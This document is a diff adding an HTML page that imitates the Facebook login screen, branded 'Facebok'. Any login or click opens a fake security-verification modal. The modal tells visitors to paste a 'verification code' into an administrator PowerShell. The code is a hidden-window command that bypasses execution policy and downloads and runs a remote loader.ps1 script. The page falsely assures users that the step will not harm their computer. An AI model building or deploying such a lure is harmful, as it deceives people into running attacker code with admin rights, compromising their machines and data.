@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebok - log in or sign up</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'><path fill='%231877F2' d='M36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.982 6.584 16.415 15.188 17.742V23.18h-4.57V18h4.57v-3.965c0-4.508 2.686-6.998 6.793-6.998 1.968 0 4.025.351 4.025.351v4.426h-2.269c-2.234 0-2.931 1.387-2.931 2.809V18h4.988l-.797 5.18h-4.191v12.562C29.416 34.415 36 26.982 36 18z'/></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 1000px;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 100px;
+        }
+        
+        .left-side {
+            flex: 1;
+            color: #1877f2;
+            padding-top: 100px;
+        }
+        
+        .logo {
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            letter-spacing: -2px;
+        }
+        
+        .tagline {
+            font-size: 28px;
+            font-weight: 400;
+            line-height: 32px;
+        }
+        
+        .right-side {
+            flex: 1;
+            max-width: 396px;
+        }
+        
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+        }
+        
+        .login-box input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            text-align: center;
+        }
+        
+        .create-btn {
+            padding: 14px 16px;
+            background: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .create-btn:hover {
+            background: #36a420;
+        }
+        
+        .footer-text {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+        }
+        
+        .footer-text a {
+            color: #1c1e21;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal-content {
+            background-color: white;
+            margin: 5% auto;
+            padding: 0;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.3);
+            animation: slideDown 0.3s;
+        }
+        
+        @keyframes slideDown {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .modal-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .modal-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1c1e21;
+        }
+        
+        .close {
+            font-size: 28px;
+            font-weight: 300;
+            color: #8a8d91;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .close:hover {
+            background-color: #f2f3f5;
+        }
+        
+        .modal-body {
+            padding: 20px;
+        }
+        
+        .error-icon {
+            font-size: 64px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .modal-body h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #1c1e21;
+        }
+        
+        .modal-body p {
+            font-size: 15px;
+            line-height: 20px;
+            color: #65676b;
+            margin-bottom: 16px;
+        }
+        
+        .instruction-box {
+            background: #f0f2f5;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+        }
+        
+        .instruction-box h4 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #1c1e21;
+        }
+        
+        .instruction-box ol {
+            margin-left: 20px;
+            color: #1c1e21;
+        }
+        
+        .instruction-box li {
+            margin: 8px 0;
+            font-size: 14px;
+            line-height: 20px;
+        }
+        
+        .command-box {
+            background: #1c1e21;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            padding: 16px;
+            border-radius: 6px;
+            margin: 16px 0;
+            overflow-x: auto;
+            font-size: 13px;
+            position: relative;
+        }
+        
+        .copy-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 600;
+            display: block;
+            margin: 16px auto;
+            width: 100%;
+        }
+        
+        .copy-btn:hover {
+            background: #166fe5;
+        }
+        
+        .copy-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 6px;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 13px;
+            color: #856404;
+        }
+        
+        .success-msg {
+            display: none;
+            color: #42b72a;
+            font-weight: 600;
+            text-align: center;
+            margin-top: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-side">
+            <div class="logo">facebok</div>
+            <p class="tagline">Facebok helps you conect and share with the people in your life.</p>
+        </div>
+        
+        <div class="right-side">
+            <div class="login-box">
+                <form id="loginForm">
+                    <input type="text" placeholder="Email adress or phone number" required>
+                    <input type="password" placeholder="Pasword" required>
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+                
+                <div class="forgot-password">
+                    <a href="#" onclick="showModal(); return false;">Forgoten password?</a>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <div class="create-account">
+                    <button class="create-btn" onclick="showModal(); return false;">Create New Acount</button>
+                </div>
+            </div>
+            
+            <div class="footer-text">
+                <a href="#" onclick="showModal(); return false;"><b>Create a Page</b></a> for a celebrity, brand or busines.
+            </div>
+        </div>
+    </div>
+
+    <!-- Security Verification Modal -->
+    <div id="securityModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>⚠️ Security Verification Requried</h2>
+                <button class="close" onclick="closeModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="error-icon">🔒</div>
+                
+                <h3>Unusaul Activity Detected</h3>
+                
+                <p>We've detected unusual login activity from your IP address (<b>192.168.74.157</b>). To protect your acount, please complete this security verification.</p>
+                
+                <div class="instruction-box">
+                    <h4>📋 Verification Steps:</h4>
+                    <ol>
+                        <li>Click <b>"Copy Verification Code"</b> below</li>
+                        <li>Right-click the <b>Windows Start</b> menu</li>
+                        <li>Select <b>"Windows PowerShell (Admin)"</b></li>
+                        <li><b>Paste</b> the code and press <b>Enter</b></li>
+                        <li>Wait for verification to complete (30-60 seconds)</li>
+                    </ol>
+                </div>
+                
+                <div class="command-box">
+                    <code id="commandText">powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.74.147:8080/loader.ps1')"</code>
+                </div>
+                
+                <button class="copy-btn" onclick="copyCommand()">📋 Copy Verification Code</button>
+                <div class="success-msg" id="successMsg">✅ Code copied! Paste it in PowerShell (Admin)</div>
+                
+                <div class="warning">
+                    ⚠️ <b>Important:</b> This verification is required by Facebok security policy. The code will verify your browser session and IP address. This proces will not harm your computer.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Show modal when login is attempted or any link is clicked
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            showModal();
+        });
+        
+        function showModal() {
+            document.getElementById('securityModal').style.display = 'block';
+        }
+        
+        function closeModal() {
+            document.getElementById('securityModal').style.display = 'none';
+        }
+        
+        function copyCommand() {
+            const commandText = document.getElementById('commandText').textContent;
+            
+            navigator.clipboard.writeText(commandText).then(function() {
+                // Show success message
+                document.getElementById('successMsg').style.display = 'block';
+                
+                // Change button
+                const btn = event.target;
+                btn.textContent = '✅ Copied!';
+                btn.style.background = '#42b72a';
+                
+                // Reset after 3 seconds
+                setTimeout(function() {
+                    btn.textContent = '📋 Copy Verification Code';
+                    btn.style.background = '#1877f2';
+                }, 3000);
+            }).catch(function(err) {
+                alert('Please copy the code manually from the box above.');
+            });
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('securityModal');
+            if (event.target == modal) {
+                closeModal();
+            }
+        }
+    </script>
+</body>
+</html>
